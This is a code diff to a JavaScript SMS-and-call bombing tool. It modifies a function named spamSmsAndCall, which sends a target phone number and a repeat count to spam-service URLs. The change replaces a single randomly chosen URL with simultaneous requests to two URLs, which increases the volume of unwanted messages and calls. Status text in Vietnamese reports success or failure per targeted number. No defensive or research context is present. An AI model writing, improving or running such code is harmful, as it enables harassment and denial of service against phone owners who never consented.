@@ -38,20 +38,25 @@ function processQueue() {
 }
 
 function spamSmsAndCall(phone, times, listItem) {
-    // Randomly select a URL from the list
-    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
-    const url = `${randomUrl}phone=${phone}&amout=${times}`;
-    
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            listItem.innerText = `Thành Công ${phone}: ${data.message}`;
-            processQueue();
-        })
-        .catch(error => {
-            listItem.innerText = `Thành Công ${phone}`;
-            processQueue();
-        });
+    // Create URLs for both API requests
+    const url1 = `${urls[0]}phone=${phone}&amout=${times}`;
+    const url2 = `${urls[1]}phone=${phone}&amout=${times}`;
+
+    // Fetch both URLs simultaneously
+    Promise.all([
+        fetch(url1).then(response => response.json()),
+        fetch(url2).then(response => response.json())
+    ])
+    .then(([response1, response2]) => {
+        // Combine results from both URLs
+        listItem.innerText = `Thành Công ${phone}: URL1 - ${response1.message}, URL2 - ${response2.message}`;
+        processQueue();
+    })
+    .catch(error => {
+        // Handle error case
+        listItem.innerText = `Thất Bại ${phone}`;
+        processQueue();
+    });
 }
 
 function updateStatusBar() {
@@ -62,4 +67,4 @@ function updateStatusBar() {
         listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
         statusList.appendChild(listItem);
     });
-} 
+}
